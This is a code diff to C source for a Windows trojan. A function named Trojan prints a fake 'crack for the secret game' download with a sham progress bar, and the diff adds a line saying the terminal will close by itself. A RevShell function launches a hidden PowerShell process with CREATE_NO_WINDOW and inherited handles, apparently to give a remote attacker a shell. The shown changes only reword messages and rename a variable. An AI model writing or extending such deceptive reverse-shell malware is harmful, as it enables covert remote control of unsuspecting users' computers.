@@ -66,7 +66,9 @@ void Trojan(){
     printf("     \\/                     \\/            \\/     \\/      \\/              \\/     \\/    \\/     \\/  \n");
 
     printf("\n");
-    printf("Now downloading crack for the secret game 'Frosted Flakes' \nPlease be patient... \n");
+    printf("Now downloading crack for the secret game 'Frosted Flakes' \nThis Terminal will automatically close when finished.\nPlease be patient... \n");
+    printf("\n");
+    
     
     //Fake a Progress bar
     #define PROGRESS_BAR_SIZE 40
@@ -215,8 +217,8 @@ int RevShell(void){
 	PROCESS_INFORMATION pinfo;
     //have to set "cmd" to a modifiable array else the error:
     //iso forbids converting string constant to lpstr -wwrite-strings (aka char*)
-	char cmd[]= "PowerShell";
-	CreateProcessA(NULL,cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+	char PowerShell[]= "PowerShell";
+	CreateProcessA(NULL,PowerShell, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
     
     
 }
